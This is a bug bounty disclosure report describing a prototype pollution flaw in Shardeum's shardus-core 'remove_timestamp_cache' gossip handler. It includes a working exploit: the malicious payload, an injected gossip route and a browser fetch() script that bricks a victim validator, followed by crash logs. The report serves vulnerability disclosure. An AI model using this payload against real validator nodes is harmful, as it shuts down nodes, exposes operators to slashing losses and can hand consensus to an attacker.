# 33638 - \[BC - Critical] In remove\_timestamp\_cache a prototype polluti...

## In " remove\_timestamp\_cache " a prototype pollution bricks validators

Submitted on Jul 25th 2024 at 13:18:20 UTC by @infosec\_us\_team for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33638

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)

### Description

### Brief/Intro

A prototype pollution attack that bricks validators.

Differently from the prototype pollution attack our team discover in report `#33637`, the vulnerable code is located in a different function and is not an assignment but a `delete` operation, requiring a different type of payload to become exploitable.

## Report Description

### The vulnerable code snippet

Below is the handler of the gossip route `remove_timestamp_cache` as reference:

```
this.p2p.registerInternal(
  'remove_timestamp_cache',
  async (
    payload: TimestampRemoveRequest,
    respond: (result: boolean) => unknown
  ) => {
    const { txId, receipt2, cycleCounter } = payload
    /* eslint-disable security/detect-object-injection */
    if (this.txTimestampCache[cycleCounter] && this.txTimestampCache[cycleCounter][txId]) {
      // remove the timestamp from the cache
      delete this.txTimestampCache[cycleCounter][txId]
      this.txTimestampCache[cycleCounter][txId] = null
      /* prettier-ignore */ this.mainLogger.debug(`Removed timestamp cache for txId: ${txId}, timestamp: ${Utils.safeStringify(this.txTimestampCache[cycleCounter][txId])}`)
      nestedCountersInstance.countEvent('consensus', 'remove_timestamp_cache')
    }
    await respond(true)
  }
)
```

> Code snippet from: <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/TransactionConsensus.ts#L264-L281>

The value of `cycleCounter` and `txId` is controlled by the sender.

#### The first step in the execution flow

The function checks that the cycle counter and tx were previously saved in the cache. If they are not, the function returns without doing anything.

```
┌──────────────────────┐                
│remove_timestamp_cache│                
└───────────┬──────────┘                
      ______▽______                     
     ╱             ╲       ┌─────────┐  
    ╱ Is the value  ╲______│Delete it│  
    ╲ in the cache? ╱yes   └────┬────┘  
     ╲_____________╱    ┌───────▽──────┐
            │no         │Set it to NULL│
          ┌─▽─┐         └───────┬──────┘
          │END│               ┌─▽─┐     
          └───┘               │END│     
                              └───┘     
```

The code for these checks is:

```
if (this.txTimestampCache[ cycleCounter ] &&
     this.txTimestampCache[ cycleCounter ][ txId ]) {
```

Unfortunately, both evaluations can be bypassed as follow:

**Step 1-** Set `cycleCounter` to `__proto__`

> Which evaluates as `this.txTimestampCache[ '__proto__' ]`, returning the Prototype of all Javascript objects.
>
> *All objects in javascript have a prototype they inherit properties from, like **object.toString()***.

**Step 2-** Set `txId` to any default function existing in all Javascript objects, for example, **hasOwnProperty(...)** or **toString(...)**.

Both checks pass because all objects contain a non-null/non-undefined value in `object["__proto__"]`, `object["__proto__"]["toString"]`, `object["__proto__"]["hasOwnProperty"]` and other default properties of an object.

```
// returns true
if (this.txTimestampCache[ '__proto__' ] &&

     // returns true
     this.txTimestampCache[ '__proto__' ][ 'hasOwnProperty' ] ) {
```

#### The last step in the execution flow

Finally, the function deletes and sets to null the value stored in the cache.

```
delete this.txTimestampCache[cycleCounter][txId]
this.txTimestampCache[cycleCounter][txId] = null
```

#### Deleting the default inherited properties of all Javascript objects, existing and to-be-created.

As a test, create an object in Typescript:

```
let anyObject = JSON.parse("{}");
```

Then print the output of its "*toString()*" function:

```
console.log(anyObject.toString());

// "[object Object]"
```

The console will output *"\[object Object]"*

Now, delete and set `anyObject['__proto__']['toString']` to null, then print the output of its "*toString()*" function:

```
delete anyObject['__proto__']['toString'];
anyObject['__proto__']['toString'] = null;

console.log(anyObject.toString()); 

// ERROR: anyObject.toString is not a function. (In 'anyObject.toString()', 'anyObject.toString' is null) 
```

The error "anyObject.toString is not a function. (In 'anyObject.toString()', 'anyObject.toString' is null) " is thrown.

But what's worse, we deleted *toString()* from ALL existing objects and any new object created.

Create a completely new object right after and run his *toString()* function:

```
let anotherObject = JSON.parse("{}");

console.log(anotherObject.toString());

// ERROR: anotherObject.toString is not a function. (In 'anotherObject.toString()', 'anotherObject.toString' is null) 
```

#### Exploiting the attack vector

Active nodes can gossip other validators to the internal route `remove_timestamp_cache`.

If the gossipped message contains the following payload:

```
{ txId: "hasOwnProperty", cycleCounter: "__proto__", receipt2: "ok" }
```

Then the vulnerable code evaluates to:

```
    // returns true
    if (this.txTimestampCache[ '__proto__' ] && 
      // returns true
      this.txTimestampCache[ '__proto__' ][ 'hasOwnProperty' ]) {

      delete this.txTimestampCache[ '__proto__' ][ 'hasOwnProperty' ]
      this.txTimestampCache[ '__proto__' ][ 'hasOwnProperty' ] = null

      // The property hasOwnProperty was removed from all objects

    }
```

### A chain of crashes in Shardus Core and Shardeum

Almost all core functions in Shardus Core, Shardeum and most libraries imported need at some point access to the functions `hasOwnProperty` and `toString` of an object.

When an attacker exploits the prototype pollution vector described in this report to delete and set to null all inherited properties of all objects, these functions crash, when they crash the server tries to exit by calling the function `exitUncleanly(..)`, but `exitUncleanly(..)` crashes as well preventing the node from shutting down.

An infinite loop of `crash -> try to exit -> repeat` begins.

One of the core functionalities that crashes in a loop is the syncing processes in the CycleMaker.

* Trying to fetch the previous record crashes repeatedly.

```
[2024-07-25T01:27:18.043] [WARN] p2p - CycleCreator: cc: cycleCreator: Could not get fetch prevRecord. Trying again in 1 sec...  cct7
```

* Trying to sync a new cycle crashes repeatedly.

```
[2024-07-25T01:27:19.046] [WARN] p2p - CycleCreator: CycleCreator: fetchLatestRecord: syncNewCycles failed: Error: warning: getNewestCycle: no newestCycle yet at Error: warning: getNewestCycle: no newestCycle yet
    at getNewestCycle (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/Sync.ts:461:37)
    at processTicksAndRejections (node:internal/process/task_queues:95:5)
    at syncNewCycles (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/Sync.ts:261:21)
    at fetchLatestRecord (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/CycleCreator.ts:813:5)
    at cycleCreator (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/CycleCreator.ts:366:20)
    at Timeout._onTimeout (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/CycleCreator.ts:917:7)
```

The shardus-net's listen callback and other libraries, they all crash in a loop:

```
Error in shardus-net's listen callback: TypeError: Cannot read properties of null (reading 'call')
    at Object.typeReviver (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/shardus-core/node_modules/@shardus/types/src/utils/functions/stringify.ts:189:37)
    at JSON.parse (<anonymous>)
    at safeJsonParse (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/shardus-core/node_modules/@shardus/types/src/utils/functions/stringify.ts:48:15)
    at jsonParse (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/shardus-core/node_modules/@shardus/net/src/util/Encoding.ts:6:25)
    at extractUUIDHandleData (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/shardus-core/node_modules/@shardus/net/src/index.ts:368:45)
    at /home/z/Documents/Temporal/playground/shardeum/pocs/server4/shardus-core/node_modules/@shardus/net/src/index.ts:455:11
```

The scheduled Snapshot does as well:

```
TypeError: Cannot read properties of null (reading 'snapshot')
    at Statistics._takeSnapshot (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/statistics/index.ts:342:30)
    at listOnTimeout (node:internal/timers:569:17)
    at processTimers (node:internal/timers:512:7)
```

And more.

## Impact of executing the attack vector

* The victim (a node or a group of nodes) can be moved to an invalid state where all core functionalities crash.
* The node is unable to restart/quit because `exitUncleanly(..)` crashes as well. As a consequence, he is forced to keep running no matter what invalid state he is in.
* The node is removed from the network and won't be able to join again because most of its core functionality crashes.
* Attacking selected nodes to silently brick them while they are selected as the active validators, exposes them to unfair slashing, which creates a loss of funds.
* In the worst-case scenario, over time all nodes except those controlled by the attacker, will have been polluted, put into an invalid state, and kicked out of the network. Then only malicious nodes can be selected, allowing them to control the outcome of any consensus.

### Proof of concept

Before modifying the code directly to include the proof of concept, is important to start a fresh setup to prevent issues raised by working with a custom version of the codebase.

### Prepare a fresh setup

* Clone the Shardus Core and Shardeum repo locally.
* Apply the `debug-10-nodes.patch` patch.
* Point Shardeum to the local version of Shardus Core by modifying the file `package.json` as instructed in the repos.
* In your local copy of Shardeum, open the file `./src/index.ts` and add the following function at line #1125 (<https://github.com/shardeum/shardeum/blob/dev/src/index.ts#L1125>)

```
  shardus.registerExternalPost('infosec_gossipAnything/', externalApiMiddleware, async (req, res) => {
    try {
      const obj = JSON.parse(JSON.stringify(req.body));

      const route = req.query.route as string;

      const pk = req.query.pk as string;
      let node = shardus.getNodeByPubKey(pk);

      console.log(`INFOSEC: sending to node: ${JSON.stringify({ node })}`);
      await shardus.p2p.tell([node], route, obj, true, '')

      return res.json({ "ok": 1 });
    } catch (e) {
      return res.json({ "error": e });
    }
  });
```

> The code snippet above allows a malicious node to receive an HTTP **POST** request with a public key, a route, and a payload, then gossip it to the corresponding victim.
>
> We will use this entry point to gossip a message from a malicious validator to a victim

* Install dependencies and build both repositories.
* Start the network with `shardus start 10`
* Go to the monitor page at <http://SERVER\\_IP:3000/> and wait until the `Cycle Counter` number **15**. By that time all 10 nodes should be active.

### Distributing the malicious payload

By now, all 10 nodes should be active.

* Select any node you want to be the victim

For this example, we'll pick the one running at port 9003.

Visit <http://SERVER\\_IP:4000/nodelist> - you will see a list of active nodes and their public keys. Copy the public key of the node running at port 9003.

* Select any node you want to act maliciously.

For this example, we'll pick the one running at port 9002.

In a new tab visit <http://SERVER\\_IP:9002> (replace *9002* with the port of the node you decide to pick as malicious).

* Prepare the payload.

While still in the tab for the URL <http://SERVER\\_IP:9002> - open the developer console in your browser *(right-click in the blank space of the page, select "Inspect element", then click in the "Console" tab)*.

Paste the following snippet of code in the console. **REPLACE "SERVER\_IP" with the IP of the server and REPLACE "PK\_OF\_VICTIM" with the public key of the victim you selected.**

```
fetch(`http://SERVER_IP:9002/infosec_gossipAnything/?route=remove_timestamp_cache&pk=PK_OF_VICTIM`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        txId: "hasOwnProperty",
        cycleCounter: "__proto__",
        receipt2: "ok"
    })
}).then(response => {
    if (!response.ok) {
        throw new Error('Network response was not ok');
    }
    return response.json();
}).then(data => {
    console.log('Success:', data);
}).catch(error => {
    console.error('Error:', error);
});
```

Press Enter on your keyboard to execute the code.

## State of the victim node after sending the payload

If the steps were followed correctly:

* The browser console will output:

```
Success - { ok: 1 }
```

* The Network Monitor running at port 3000 will paint in red the victim node and later remove it from the screen.
* The victim node starts to constantly throw exceptions in core functionality:

As soon as our payload is processed by the victim it outputs the following to the logs:

```
[2024-07-25T01:26:33.320] [DEBUG] main - Removed timestamp cache for txId: hasOwnProperty, timestamp: null
```

> Verify this in the log file located at `./instances/shardus-instance-9003/logs/main.log`

And immediately everything starts crashing everywhere:

```
[2024-07-25T01:26:33.321] [ERROR] main - Network: _setupInternal:  TypeError: Cannot read properties of null (reading 'call')
    at Object.typeReviver (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/shardus-core/node_modules/@shardus/types/src/utils/functions/stringify.ts:189:37)
    at JSON.parse (<anonymous>)
    at Object.safeJsonParse (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/shardus-core/node_modules/@shardus/types/src/utils/functions/stringify.ts:48:15)
    at Crypto.sign (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/crypto/index.ts:198:27)
    at Crypto.signWithSize (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/crypto/index.ts:189:17)
    at _wrapAndSignMessage (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/Comms.ts:257:17)
    at respondWrapped (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/Comms.ts:545:17)
    at /home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/state-manager/TransactionConsensus.ts:279:15
    at wrappedHandler (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/Comms.ts:585:11)
    at /home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/network/index.ts:233:15
[2024-07-25T01:26:33.374] [ERROR] main - DBG Network: _setupInternal > sn.listen > callback > data {
  payload: {
    msgSize: 235,
    payload: {
      cycleCounter: '__proto__',
      receipt2: 'ok',
      txId: 'hasOwnProperty'
    },
    sender: '5bacdb9dfd76099bb98d33b63f687f3b7ad1152f12232ee9fb4aebd5ba1dd07f',
    tracker: 'key_remove_timestamp_cache_5bacxdd07f_1721888793304_42',
    sign: {
      owner: 'ab83bcdb9d30951bf23e008ab8fd31e15b173c69c3b3aabdc6fa4b85c75764a4',
      sig: '0ca7a777398f6164fd64d859ae8150e9b1dbf059a2683cfad3ae72b33d74528b36822a30f790c9e4acf255228074778b65ad77807ea3dc498d16b7c468019b0b36a651b5fb9e094b50a5a3379c6a6814b4f20f7cf6f5aed3b2c458eb490a3ec5'
    }
  },
  route: 'remove_timestamp_cache'
}
[2024-07-25T01:26:33.374] [ERROR] main - DBG Network: _setupInternal > sn.listen > callback > remote { address: '127.0.0.1', port: 58814 }
[2024-07-25T01:26:34.088] [INFO] main - exitUncleanly: logFatalAndExit
[2024-07-25T01:26:34.088] [INFO] main - Stopping reporter...
[2024-07-25T01:26:34.089] [INFO] main - Stopping statistics reporting...
[2024-07-25T01:26:34.089] [INFO] main - Stopping POW generators...
[2024-07-25T01:26:34.092] [INFO] main - exitUncleanly: logFatalAndExit
[2024-07-25T01:26:35.083] [INFO] main - exitUncleanly: logFatalAndExit
[2024-07-25T01:26:36.084] [INFO] main - exitUncleanly: logFatalAndExit
[2024-07-25T01:26:37.085] [INFO] main - exitUncleanly: logFatalAndExit
[2024-07-25T01:26:38.085] [INFO] main - exitUncleanly: logFatalAndExit
[2024-07-25T01:26:39.011] [INFO] main - exitUncleanly: logFatalAndExit
[2024-07-25T01:26:39.085] [INFO] main - exitUncleanly: logFatalAndExit
...
```

> Verify this in the log file located at `./instances/shardus-instance-9003/logs/main.log`

Including the snapshot feature:

```
[2024-07-25T01:48:07.291] [FATAL] fatal - unhandledRejection: TypeError: Cannot read properties of null (reading 'snapshot')
    at Statistics._takeSnapshot (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/statistics/index.ts:342:30)
    at listOnTimeout (node:internal/timers:569:17)
    at processTimers (node:internal/timers:512:7)
```

> Verify this in the log file located at `./instances/shardus-instance-9003/logs/fatal.log`

His attempt to "apoptosize" himself:

```
[2024-07-25T01:48:08.294] [FATAL] fatal - unhandledRejection: TypeError: Cannot read properties of null (reading 'call')
    at Object.typeReviver (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/shardus-core/node_modules/@shardus/types/src/utils/functions/stringify.ts:189:37)
    at JSON.parse (<anonymous>)
    at Object.safeJsonParse (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/shardus-core/node_modules/@shardus/types/src/utils/functions/stringify.ts:48:15)
    at Crypto.sign (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/crypto/index.ts:198:27)
    at createProposal (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/Apoptosis.ts:382:17)
    at Object.apoptosizeSelf (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/Apoptosis.ts:315:20)
    at fetchLatestRecord (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/CycleCreator.ts:839:17)
    at processTicksAndRejections (node:internal/process/task_queues:95:5)
    at runNextTicks (node:internal/process/task_queues:64:3)
    at listOnTimeout (node:internal/timers:538:9)
```

> Verify this in the log file located at `./instances/shardus-instance-9003/logs/fatal.log`

The functionality of the CycleCreator:

```
[2024-07-25T01:36:17.903] [WARN] p2p - CycleCreator: CycleCreator: fetchLatestRecord: syncNewCycles failed: Error: warning: getNewestCycle: no newestCycle yet at Error: warning: getNewestCycle: no newestCycle yet
    at getNewestCycle (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/Sync.ts:461:37)
    at processTicksAndRejections (node:internal/process/task_queues:95:5)
    at runNextTicks (node:internal/process/task_queues:64:3)
    at listOnTimeout (node:internal/timers:538:9)
    at processTimers (node:internal/timers:512:7)
    at syncNewCycles (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/Sync.ts:261:21)
    at fetchLatestRecord (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/CycleCreator.ts:813:5)
    at cycleCreator (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/CycleCreator.ts:366:20)
    at Timeout._onTimeout (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/p2p/CycleCreator.ts:917:7)
[2024-07-25T01:36:17.903] [ERROR] p2p - CycleCreator: CycleCreator: fetchLatestRecord_B: fetchLatestRecordFails > maxFetchLatestRecordFails. apoptosizeSelf 
[2024-07-25T01:36:17.903] [WARN] p2p - Apoptosis: In apoptosizeSelf. Apoptosized within fetchLatestRecord() => src/p2p/CycleCreator.ts
[2024-07-25T01:36:17.903] [WARN] p2p - CycleCreator: cc: cycleCreator: Could not get fetch prevRecord. Trying again in 1 sec...  cct7
```

> Verify this in the log file located at `./instances/shardus-instance-9003/logs/p2p.log`

The node is removed from the network and he's forced to keep running under an invalid state because the function that exits crashes as well.
